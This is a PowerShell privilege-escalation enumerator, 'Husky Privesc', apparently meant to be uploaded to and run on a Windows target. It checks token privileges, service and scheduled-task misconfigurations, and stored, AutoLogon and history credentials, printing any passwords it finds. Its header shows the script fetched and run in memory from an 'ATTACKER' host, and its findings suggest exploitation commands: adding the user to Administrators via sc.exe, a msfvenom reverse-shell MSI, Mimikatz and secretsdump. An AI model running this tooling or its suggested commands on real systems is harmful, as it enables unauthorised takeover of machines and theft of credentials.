<#
.SYNOPSIS
    Husky Privesc — Windows Privilege Escalation Enumerator
.DESCRIPTION
    Upload to Windows target and run. Checks privileges, services,
    scheduled tasks, credentials, registry, and common misconfigs.
    Pure PowerShell — no dependencies.
.EXAMPLE
    .\privesc.ps1
    powershell -ep bypass -f privesc.ps1
    IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8000/privesc.ps1')
#>

$Host.UI.RawUI.WindowTitle = "Husky Privesc"

# ═══════════ Colors ═══════════
function Write-Banner {
    Write-Host ""
    Write-Host "    HUSKY HACKER" -ForegroundColor Cyan
    Write-Host "    P R I V E S C   E N U M E R A T O R" -ForegroundColor White
    Write-Host "    Find the path. Take the crown." -ForegroundColor DarkGray
    Write-Host ""
}

function Write-Section($title) {
    Write-Host "`n  === $title ===" -ForegroundColor Cyan
}

function Write-Crit($msg, $detail) {
    Write-Host "  [CRITICAL] $msg" -ForegroundColor Red
    if ($detail) { Write-Host "    -> $detail" -ForegroundColor DarkGray }
    $script:crits++
}

function Write-High($msg, $detail) {
    Write-Host "  [HIGH] $msg" -ForegroundColor Yellow
    if ($detail) { Write-Host "    -> $detail" -ForegroundColor DarkGray }
    $script:highs++
}

function Write-Med($msg, $detail) {
    Write-Host "  [MEDIUM] $msg" -ForegroundColor Cyan
    if ($detail) { Write-Host "    -> $detail" -ForegroundColor DarkGray }
    $script:meds++
}

function Write-Info($msg) {
    Write-Host "  [*] $msg" -ForegroundColor DarkGray
}

$script:crits = 0
$script:highs = 0
$script:meds = 0

# ═══════════════════════════════════════════════════════════
Write-Banner

# ═══════════ System Info ═══════════
Write-Section "System Information"
$os = Get-CimInstance Win32_OperatingSystem
$cs = Get-CimInstance Win32_ComputerSystem
Write-Info "Hostname: $($env:COMPUTERNAME)"
Write-Info "OS: $($os.Caption) $($os.Version)"
Write-Info "Domain: $($cs.Domain)"
Write-Info "User: $($env:USERDOMAIN)\$($env:USERNAME)"
Write-Info "Architecture: $($os.OSArchitecture)"

# Domain joined?
if ($cs.PartOfDomain) {
    Write-Info "Machine is DOMAIN JOINED to $($cs.Domain)"
}

# ═══════════ Privileges ═══════════
Write-Section "Token Privileges"
$privs = whoami /priv 2>$null
if ($privs) {
    $dangerousPrivs = @{
        "SeImpersonatePrivilege"    = "GodPotato / PrintSpoofer / JuicyPotato -> SYSTEM"
        "SeAssignPrimaryTokenPrivilege" = "Token manipulation -> SYSTEM"
        "SeBackupPrivilege"         = "Backup SAM/SYSTEM -> offline hash extraction"
        "SeRestorePrivilege"        = "Overwrite system files"
        "SeTcbPrivilege"            = "TcbElevation.exe -> SYSTEM"
        "SeDebugPrivilege"          = "Debug system processes -> migrate into SYSTEM"
        "SeLoadDriverPrivilege"     = "Load vulnerable kernel driver"
        "SeTakeOwnershipPrivilege"  = "Take ownership of any object"
        "SeCreateTokenPrivilege"    = "Create arbitrary tokens"
    }

    foreach ($priv in $dangerousPrivs.Keys) {
        if ($privs -match $priv) {
            $enabled = $privs | Select-String $priv
            if ($enabled -match "Enabled") {
                Write-Crit "$priv is ENABLED" $dangerousPrivs[$priv]
            } else {
                Write-High "$priv present (disabled — may be enableable)" $dangerousPrivs[$priv]
            }
        }
    }
}

# ═══════════ Groups ═══════════
Write-Section "Group Membership"
$groups = whoami /groups 2>$null
$interestingGroups = @(
    "BUILTIN\Administrators", "Backup Operators", "Server Operators",
    "Account Operators", "DnsAdmins", "Domain Admins",
    "Remote Desktop Users", "Remote Management Users",
    "BUILTIN\Remote Desktop Users"
)
foreach ($grp in $interestingGroups) {
    if ($groups -match [regex]::Escape($grp)) {
        Write-High "Member of: $grp"
    }
}

# Local admin check
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    Write-Crit "Running as LOCAL ADMINISTRATOR" "Already have admin — grab hashes with Mimikatz"
}

# ═══════════ Services ═══════════
Write-Section "Service Misconfigurations"

# Unquoted service paths
Write-Info "Checking unquoted service paths..."
$services = Get-CimInstance Win32_Service | Where-Object {
    $_.PathName -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch '^C:\\Windows\\' -and
    $_.PathName -match ' '
}
foreach ($svc in $services) {
    Write-High "Unquoted service path: $($svc.Name)" "$($svc.PathName)"
}

# Writable service binaries
Write-Info "Checking service binary permissions..."
Get-CimInstance Win32_Service | ForEach-Object {
    $path = $_.PathName
    if ($path) {
        # Extract executable path
        if ($path.StartsWith('"')) {
            $exePath = ($path -split '"')[1]
        } else {
            $exePath = ($path -split ' ')[0]
        }
        if ($exePath -and (Test-Path $exePath -ErrorAction SilentlyContinue)) {
            try {
                $acl = Get-Acl $exePath -ErrorAction SilentlyContinue
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -match "Everyone|Users|Authenticated Users|$currentUser" -and
                        $access.FileSystemRights -match "Modify|FullControl|Write") {
                        Write-Crit "Writable service binary: $($_.Name)" "Path: $exePath — replace with malicious exe"
                    }
                }
            } catch {}
        }
    }
}

# Modifiable service configs (sc.exe)
Write-Info "Checking service config permissions..."
$currentUser = whoami 2>$null
$svcList = sc.exe query state=all 2>$null | Select-String "SERVICE_NAME" | ForEach-Object {
    ($_ -split ':')[1].Trim()
}
foreach ($svc in $svcList | Select-Object -First 50) {
    $sdshow = sc.exe sdshow $svc 2>$null
    if ($sdshow -match "RP.*WD.*WP") {
        Write-High "Service may be reconfigurable: $svc" "sc.exe config $svc binPath= `"cmd /c net localgroup Administrators $currentUser /add`""
    }
}

# ═══════════ Scheduled Tasks ═══════════
Write-Section "Scheduled Tasks"
Write-Info "Checking for writable scheduled task binaries..."
$tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
foreach ($task in $tasks) {
    $action = $task."Task To Run"
    if ($action -and $action -ne "N/A" -and $action -notmatch "COM handler") {
        # Extract path
        $taskPath = ($action -split ' ')[0].Trim('"')
        if ($taskPath -and (Test-Path $taskPath -ErrorAction SilentlyContinue)) {
            if ((Get-Acl $taskPath -ErrorAction SilentlyContinue).Access |
                Where-Object { $_.IdentityReference -match "Everyone|Users|Authenticated" -and
                              $_.FileSystemRights -match "Modify|FullControl|Write" }) {
                Write-High "Writable scheduled task binary: $($task.TaskName)" "Binary: $taskPath"
            }
        }
    }
}

# ═══════════ AlwaysInstallElevated ═══════════
Write-Section "AlwaysInstallElevated"
$hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hkcu -eq 1 -and $hklm -eq 1) {
    Write-Crit "AlwaysInstallElevated is ENABLED!" "msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi && msiexec /quiet /qn /i evil.msi"
} else {
    Write-Info "AlwaysInstallElevated: Not enabled"
}

# ═══════════ Stored Credentials ═══════════
Write-Section "Stored Credentials"

# cmdkey
$cmdkey = cmdkey /list 2>$null
if ($cmdkey -match "Target:") {
    Write-High "Stored credentials found (cmdkey /list):" "runas /savecred /user:<user> cmd.exe"
    $cmdkey | Select-String "Target:" | ForEach-Object { Write-Info "  $_" }
}

# AutoLogon
$autoUser = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue).DefaultUserName
$autoPass = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue).DefaultPassword
if ($autoPass) {
    Write-Crit "AutoLogon password found!" "User: $autoUser  Password: $autoPass"
} elseif ($autoUser) {
    Write-Med "AutoLogon username: $autoUser (no password in registry)"
}

# DPAPI credential files
$dpapi = Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
if ($dpapi) {
    Write-Med "DPAPI credential files found: $($dpapi.Count) file(s)" "May be decryptable with Mimikatz dpapi::cred"
}

# ═══════════ PowerShell History ═══════════
Write-Section "PowerShell History"
$histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $histPath) {
    $histSize = (Get-Item $histPath).Length
    Write-High "PowerShell history found: $histPath ($histSize bytes)"
    $passHits = Select-String -Path $histPath -Pattern "pass|pwd|cred|secret|key|token" -ErrorAction SilentlyContinue | Select-Object -First 5
    foreach ($hit in $passHits) {
        Write-Info "  $($hit.Line.Trim())"
    }
} else {
    Write-Info "No PowerShell history file found"
}

# ═══════════ Interesting Files ═══════════
Write-Section "Interesting Files"

# SAM/SYSTEM backups
$samPaths = @(
    "C:\Windows\Repair\SAM",
    "C:\Windows\Repair\SYSTEM",
    "C:\Windows\System32\config\RegBack\SAM",
    "C:\Windows\System32\config\RegBack\SYSTEM"
)
foreach ($p in $samPaths) {
    if (Test-Path $p -ErrorAction SilentlyContinue) {
        Write-High "SAM/SYSTEM backup: $p" "Copy to attacker + impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
    }
}

# Unattend files
$unattendPaths = @(
    "C:\Unattend.xml", "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\System32\Sysprep\unattend.xml",
    "C:\Windows\System32\Sysprep\Panther\unattend.xml"
)
foreach ($p in $unattendPaths) {
    if (Test-Path $p -ErrorAction SilentlyContinue) {
        Write-High "Unattend file: $p" "May contain plaintext admin credentials"
    }
}

# Password files
Write-Info "Searching for password files..."
$passFiles = Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -lt 1MB } |
    Select-Object -First 100 |
    Select-String -Pattern "password|passwd|pwd|credential" -ErrorAction SilentlyContinue |
    Select-Object -Unique Path -First 10
foreach ($f in $passFiles) {
    Write-Med "Possible creds in: $($f.Path)"
}

# ═══════════ Network ═══════════
Write-Section "Network & Internal Services"
Write-Info "Listening ports:"
$listeners = netstat -ano 2>$null | Select-String "LISTENING"
$internalPorts = @{
    "3306" = "MySQL"; "5432" = "PostgreSQL"; "6379" = "Redis";
    "27017" = "MongoDB"; "1433" = "MSSQL"; "8080" = "HTTP-internal";
    "3000" = "Dev-app"; "9200" = "Elasticsearch"
}
foreach ($line in $listeners) {
    $lineStr = $line.ToString().Trim()
    foreach ($port in $internalPorts.Keys) {
        if ($lineStr -match "127\.0\.0\.1:$port\s") {
            Write-Med "Internal $($internalPorts[$port]) on 127.0.0.1:$port"
        }
    }
}

# Installed software
Write-Section "Installed Software"
Write-Info "Non-default software:"
$software = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
    Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Microsoft|Windows|Update|Visual C\+\+|\.NET" } |
    Select-Object DisplayName, DisplayVersion -First 20
foreach ($sw in $software) {
    Write-Info "  $($sw.DisplayName) $($sw.DisplayVersion)"
}

# ═══════════ Summary ═══════════
Write-Host ""
Write-Host "  =================================================" -ForegroundColor Red
Write-Host "  PRIVESC SUMMARY" -ForegroundColor White
Write-Host "  -------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  CRITICAL: $script:crits  " -NoNewline -ForegroundColor Red
Write-Host "HIGH: $script:highs  " -NoNewline -ForegroundColor Yellow
Write-Host "MEDIUM: $script:meds" -ForegroundColor Cyan
Write-Host "  =================================================" -ForegroundColor Red
Write-Host ""
